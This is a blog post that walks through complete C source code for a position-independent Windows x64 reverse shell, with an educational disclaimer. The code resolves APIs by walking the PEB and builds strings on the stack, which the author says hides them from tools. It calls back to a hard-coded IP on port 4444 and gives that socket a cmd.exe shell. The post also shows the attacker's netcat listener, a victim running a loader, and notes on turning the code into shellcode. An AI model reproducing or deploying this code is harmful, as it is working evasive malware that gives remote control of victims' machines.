---
title: Position Independent Code x64 Win32 C implementation of reverse shell
categories: [win32, programming, malware]
tags: [lowlevel]
---

> Disclaimer: This article is only is for educational and not for malicious purpose.
{: .prompt-info }

A C x64 Win32 position-independent (PIC) reverse shell is executable code that connects to a remote machine.
And creates a shell to execute commands on that machine.

The PIC feature means code can be executed at any memory address without modification.

With further experimentation I can get a assembly shellcode from this C code.
Exemple with my custom shellcode generation tool (coded in java).

![Reverse shell shellcode generator tool (written in java)](/assets/revsh.png)

___

Firstly i've setup the code for dynamic api call.

We need :
- Typedef definition
- Dynamic PEB 
- Dynamic resolve function (hidden from IAT)

Typedef exemple with WSAStartup 
```c
typedef int(WINAPI* WSAStartupFunc)(WORD, LPWSADATA);
```

peb_lookup.h:
```c
#include <windows.h>
#include <winternl.h>

#ifndef TO_LOWERCASE
#define TO_LOWERCASE(out, c1) (out = (c1 <= 'Z' && c1 >= 'A') ? c1 = (c1 - 'A') + 'a': c1)
#endif

inline LPVOID get_module_by_name(WCHAR* module_name);
inline LPVOID get_func_by_name(LPVOID module, char* func_name);


// enhanced version of LDR_DATA_TABLE_ENTRY
typedef struct _LDR_DATA_TABLE_ENTRY1 {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG   SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG   Flags;
    SHORT   LoadCount;
    SHORT   TlsIndex;
    HANDLE  SectionHandle;
    ULONG   CheckSum;
    ULONG   TimeDateStamp;
} LDR_DATA_TABLE_ENTRY1, * PLDR_DATA_TABLE_ENTRY1;

inline LPVOID get_module_by_name(WCHAR* module_name)
{
    PEB* peb;
#if defined(_WIN64)
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    PEB_LDR_DATA* ldr = peb->Ldr;

    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* current = head->Flink; current != head; current = current->Flink) {
        LDR_DATA_TABLE_ENTRY1* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY1, InMemoryOrderLinks);
        if (!entry || !entry->DllBase) break;

        WCHAR* curr_name = entry->BaseDllName.Buffer;
        if (!curr_name) continue;

        size_t i;
        for (i = 0; i < entry->BaseDllName.Length; i++) {
            // if any of the strings finished:
            if (module_name[i] == 0 || curr_name[i] == 0) {
                break;
            }
            WCHAR c1, c2;
            TO_LOWERCASE(c1, module_name[i]);
            TO_LOWERCASE(c2, curr_name[i]);
            if (c1 != c2) break;
        }
        // both of the strings finished, and so far they were identical:
        if (module_name[i] == 0 && curr_name[i] == 0) {
            return entry->DllBase;
        }
    }

    return nullptr;
}

inline LPVOID get_func_by_name(LPVOID module, char* func_name)
{
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh->e_lfanew);
    IMAGE_DATA_DIRECTORY* exportsDir = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (!exportsDir->VirtualAddress) {
        return nullptr;
    }

    DWORD expAddr = exportsDir->VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);
    SIZE_T namesCount = exp->NumberOfNames;

    DWORD funcsListRVA = exp->AddressOfFunctions;
    DWORD funcNamesListRVA = exp->AddressOfNames;
    DWORD namesOrdsListRVA = exp->AddressOfNameOrdinals;

    //go through names:
    for (SIZE_T i = 0; i < namesCount; i++) {
        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));
        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));
        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));

        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);
        size_t k;
        for (k = 0; func_name[k] != 0 && curr_name[k] != 0; k++) {
            if (func_name[k] != curr_name[k]) break;
        }
        if (func_name[k] == 0 && curr_name[k] == 0) {
            //found
            return (BYTE*)module + (*funcRVA);
        }
    }
    return nullptr;
}
```

After having a PIC code, now we can declare all our used api for the final code.

```c
typedef int(WINAPI* ClosesocketFunc)(SOCKET);
typedef int(WINAPI* WSACleanupFunc)(void);
typedef int(WINAPI* WSAStartupFunc)(WORD, LPWSADATA);
typedef SOCKET(WINAPI* SocketFunc)(int, int, int);
typedef ULONG(WINAPI* InetAddrFunc)(const char*);
typedef USHORT(WINAPI* HtonsFunc)(USHORT);
typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI* WaitForSingleObjectFunc)(HANDLE, DWORD);
typedef BOOL(WINAPI* CloseHandleFunc)(HANDLE);
typedef void(WINAPI* ExitProcessFunc)(UINT);
typedef int (WINAPI* MessageBoxAFunc)(HWND, LPCSTR, LPCSTR, UINT);
typedef int (WINAPI* RecvFunc)(SOCKET s, char* buf,  int len, int flags);
typedef SOCKET(WINAPI* WSASocketAFunc)(_In_ int af, _In_ int type, _In_ int protocol, _In_opt_ LPWSAPROTOCOL_INFO lpProtocolInfo, _In_ GROUP g, _In_ DWORD dwFlags);
typedef int (WINAPI* WSAConnectFunc)(SOCKET s, const struct sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS  lpSQOS, LPQOS lpGQOS);



int ReverseShell(char* server_ip, unsigned short server_port)
{
	WSADATA wsaData;
	SOCKET sock = NULL;
	struct sockaddr_in server;

	// stack based string 
	CHAR cmdline[] = { 'c','m','d','.','e','x','e',0 };
	//CHAR connectStr[] = { 'c','o','n','n','e','c','t',0 };
	CHAR closesocketStr[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
	CHAR WSACleanupStr[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
	CHAR WSAStartupStr[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
	CHAR WSASocketAStr[] = { 'W','S','A','S','o','c','k','e','t','A',0 };
	CHAR WSAConnectStr[] = { 'W','S','A','C','o','n','n','e','c','t',0 };
	CHAR socketStr[] = { 's','o','c','k','e','t',0 };
	CHAR inet_addrStr[] = { 'i','n','e','t','_','a','d','d','r',0 };
	CHAR htonsStr[] = { 'h','t','o','n','s',0 };
	CHAR recvStr[] = { 'r','e','c','v',0 };
	CHAR CloseHandleStr[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
	CHAR WaitForSingleObjectStr[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
	CHAR CreateProcessAStr[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
	CHAR ExitProcessStr[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };

	// dynamic load lib
	WCHAR baseStr[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',0 };
	LPVOID base = get_module_by_name(baseStr);
	CHAR load_libStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	LPVOID load_lib = get_func_by_name((HMODULE)base, load_libStr);
	CHAR get_procStr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
	LPVOID get_proc = get_func_by_name((HMODULE)base, get_procStr);
	HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
	FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

	CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
	HMODULE hModule = (HMODULE)_LoadLibraryA(w2_32libStr);

	ClosesocketFunc closesocketFunc = (ClosesocketFunc)_GetProcAddress(hModule, closesocketStr);
	WSACleanupFunc wsacleanupFunc = (WSACleanupFunc)_GetProcAddress(hModule, WSACleanupStr);
	WSAStartupFunc wsastartupFunc = (WSAStartupFunc)_GetProcAddress(hModule, WSAStartupStr);
	SocketFunc socketFunc = (SocketFunc)_GetProcAddress(hModule, socketStr);
	InetAddrFunc inet_addrFunc = (InetAddrFunc)_GetProcAddress(hModule, inet_addrStr);
	HtonsFunc htonsFunc = (HtonsFunc)_GetProcAddress(hModule, htonsStr);
	RecvFunc recvFunc = (RecvFunc)_GetProcAddress(hModule, recvStr);
	WSASocketAFunc wsasocketaFunc = (WSASocketAFunc)_GetProcAddress(hModule, WSASocketAStr);
	WSAConnectFunc wsaconnectaFunc = (WSAConnectFunc)_GetProcAddress(hModule, WSAConnectStr);


	CloseHandleFunc closeHandleFunc = (CloseHandleFunc)_GetProcAddress((HMODULE)base, CloseHandleStr);
	WaitForSingleObjectFunc waitForSingleObjectFunc = (WaitForSingleObjectFunc)_GetProcAddress((HMODULE)base, WaitForSingleObjectStr);
	CreateProcessAFunc createProcessAFunc = (CreateProcessAFunc)_GetProcAddress((HMODULE)base, CreateProcessAStr);
	ExitProcessFunc exitProcessFunc = (ExitProcessFunc)_GetProcAddress((HMODULE)base, ExitProcessStr);

    // ...
}
```

Extract of the final result of the dynamic api call routine.
Somes techniques used here :
- string stack based (hide strings from tools)
```c
CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
```
- typedef definition
```c
typedef int (WINAPI* WSAConnectFunc)(SOCKET s, const struct sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS  lpSQOS, LPQOS lpGQOS);
```
- dynamic resolve peb to obtain wanted module.
```c 
WCHAR baseStr[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',0 };
LPVOID base = get_module_by_name(baseStr);
CHAR load_libStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
LPVOID load_lib = get_func_by_name((HMODULE)base, load_libStr);
CHAR get_procStr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
LPVOID get_proc = get_func_by_name((HMODULE)base, get_procStr);
HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
HMODULE hModule = (HMODULE)_LoadLibraryA(w2_32libStr);
```
- dynamic resolve function from module and create a function ptr with associated typedef :
```c
CHAR WSAStartupStr[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
WSAStartupFunc wsastartupFunc = (WSAStartupFunc)_GetProcAddress(hModule, WSAStartupStr);
```

___

Final result code:
```c
#define _WINSOCKAPI_
#include <winsock2.h>
#include "peb_lookup.h"

#define BUFFER_LEN 1000


void* _memset(void* dest, int val, size_t count)
{
	BYTE* destByte = (BYTE*)dest;
	while (count--) {
		*destByte++ = (BYTE)val;
	}
	return dest;
}

int _lstrcmpA(const char* lpString1, const char* lpString2)
{
	int result = 0;
	while (*lpString1 && *lpString2) {
		result = (*lpString1++) - (*lpString2++);
		if (result) {
			return result;
		}
	}
	return (*lpString1) - (*lpString2);
}


typedef int(WINAPI* ClosesocketFunc)(SOCKET);
typedef int(WINAPI* WSACleanupFunc)(void);
typedef int(WINAPI* WSAStartupFunc)(WORD, LPWSADATA);
typedef SOCKET(WINAPI* SocketFunc)(int, int, int);
typedef ULONG(WINAPI* InetAddrFunc)(const char*);
typedef USHORT(WINAPI* HtonsFunc)(USHORT);
typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI* WaitForSingleObjectFunc)(HANDLE, DWORD);
typedef BOOL(WINAPI* CloseHandleFunc)(HANDLE);
typedef void(WINAPI* ExitProcessFunc)(UINT);
typedef int (WINAPI* MessageBoxAFunc)(HWND, LPCSTR, LPCSTR, UINT);
typedef int (WINAPI* RecvFunc)(SOCKET s, char* buf,  int len, int flags);
typedef SOCKET(WINAPI* WSASocketAFunc)(_In_ int af, _In_ int type, _In_ int protocol, _In_opt_ LPWSAPROTOCOL_INFO lpProtocolInfo, _In_ GROUP g, _In_ DWORD dwFlags);
typedef int (WINAPI* WSAConnectFunc)(SOCKET s, const struct sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS  lpSQOS, LPQOS lpGQOS);



int ReverseShell(char* server_ip, unsigned short server_port) {
	WSADATA wsaData;
	SOCKET sock = NULL;
	struct sockaddr_in server;

	// stack based string 
	CHAR cmdline[] = { 'c','m','d','.','e','x','e',0 };
	CHAR closesocketStr[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
	CHAR WSACleanupStr[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
	CHAR WSAStartupStr[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
	CHAR WSASocketAStr[] = { 'W','S','A','S','o','c','k','e','t','A',0 };
	CHAR WSAConnectStr[] = { 'W','S','A','C','o','n','n','e','c','t',0 };
	CHAR socketStr[] = { 's','o','c','k','e','t',0 };
	CHAR inet_addrStr[] = { 'i','n','e','t','_','a','d','d','r',0 };
	CHAR htonsStr[] = { 'h','t','o','n','s',0 };
	CHAR recvStr[] = { 'r','e','c','v',0 };
	CHAR CloseHandleStr[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
	CHAR WaitForSingleObjectStr[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
	CHAR CreateProcessAStr[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
	CHAR ExitProcessStr[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };

	// dynamic load lib
	WCHAR baseStr[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',0 };
	LPVOID base = get_module_by_name(baseStr);
	CHAR load_libStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	LPVOID load_lib = get_func_by_name((HMODULE)base, load_libStr);
	CHAR get_procStr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
	LPVOID get_proc = get_func_by_name((HMODULE)base, get_procStr);
	HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
	FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

	CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
	HMODULE hModule = (HMODULE)_LoadLibraryA(w2_32libStr);

	ClosesocketFunc closesocketFunc = (ClosesocketFunc)_GetProcAddress(hModule, closesocketStr);
	WSACleanupFunc wsacleanupFunc = (WSACleanupFunc)_GetProcAddress(hModule, WSACleanupStr);
	WSAStartupFunc wsastartupFunc = (WSAStartupFunc)_GetProcAddress(hModule, WSAStartupStr);
	SocketFunc socketFunc = (SocketFunc)_GetProcAddress(hModule, socketStr);
	InetAddrFunc inet_addrFunc = (InetAddrFunc)_GetProcAddress(hModule, inet_addrStr);
	HtonsFunc htonsFunc = (HtonsFunc)_GetProcAddress(hModule, htonsStr);
	RecvFunc recvFunc = (RecvFunc)_GetProcAddress(hModule, recvStr);
	WSASocketAFunc wsasocketaFunc = (WSASocketAFunc)_GetProcAddress(hModule, WSASocketAStr);
	WSAConnectFunc wsaconnectaFunc = (WSAConnectFunc)_GetProcAddress(hModule, WSAConnectStr);


	CloseHandleFunc closeHandleFunc = (CloseHandleFunc)_GetProcAddress((HMODULE)base, CloseHandleStr);
	WaitForSingleObjectFunc waitForSingleObjectFunc = (WaitForSingleObjectFunc)_GetProcAddress((HMODULE)base, WaitForSingleObjectStr);
	CreateProcessAFunc createProcessAFunc = (CreateProcessAFunc)_GetProcAddress((HMODULE)base, CreateProcessAStr);
	ExitProcessFunc exitProcessFunc = (ExitProcessFunc)_GetProcAddress((HMODULE)base, ExitProcessStr);

	int cpt = 0;
	while (42)
	{

		wsastartupFunc(MAKEWORD(2, 2), &wsaData);
		sock = wsasocketaFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = (ULONG)inet_addrFunc(server_ip);
		server.sin_port = (USHORT)htonsFunc(4444);

		// Connect with host
		if (wsaconnectaFunc(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocketFunc(sock);
			wsacleanupFunc();
			continue;
		}
		else
		{
			char recvData[BUFFER_LEN];
			_memset(recvData, 0, sizeof(recvData));
			int recvCode = recvFunc(sock, recvData, BUFFER_LEN, 0);

			if (recvCode <= 0)
			{
				closesocketFunc(sock);
				wsacleanupFunc();
				continue;
			}
			else
			{
				STARTUPINFO si;
				PROCESS_INFORMATION pi;
				_memset(&si, 0, sizeof(si));
				si.cb = sizeof(si);
				si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
				createProcessAFunc(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
				waitForSingleObjectFunc(pi.hProcess, INFINITE);
				closeHandleFunc(pi.hProcess);
				closeHandleFunc(pi.hThread);

				_memset(recvData, 0, sizeof(recvData));
				int recvCode = recvFunc(sock, recvData, BUFFER_LEN, 0);
				if (recvCode <= 0) {
					closesocketFunc(sock);
					wsacleanupFunc();
					continue;
				}
				char exitStr[] = { 'e', 'x', 'i', 't', '\n', 0 };
				if (_lstrcmpA(recvData, exitStr) == 0) {
					exitProcessFunc(0);
				}

			}
		}
	}



}

//int __stdcall WinMainCRTStartup(void) // windows WinMainCRTStartup

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main() {
	CHAR ipstr[] = {'1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '7', '7',  0 };
	ReverseShell(ipstr, 4444u);
	return 0;
}

```

I'll let you find out how to compile this in an optimized way. (WIP)


I've reached with 35kb .asm file ➡️ a 7kb PE binary and 5kb shellcode raw binary.

More after that, i've tried to use a custom loader (0xboku) using UUID shellcode Lazarus technique. 

In the other hand we'll need to start a tcp listener on host machine (attacker) :

```shell
netcat -lvp 4444
```

![exemple 1](/assets/sh1.png)

Now on the victime side, the user execute the reverse shell.
starting the loader:
```shell
loader.exe
```

From our side we see a connection.

![exemple 2](/assets/sh2.png)

A shell spawn.

![exemple 3](/assets/sh3.png)

And boom, magic cmd shell appear !

## Conclusion

The code thanks to position independent code ability can be extracted as a valid shellcode.


this is the end of this post, see you later on the web.

### Credit

- @hasherezade for dynamic PEB lookup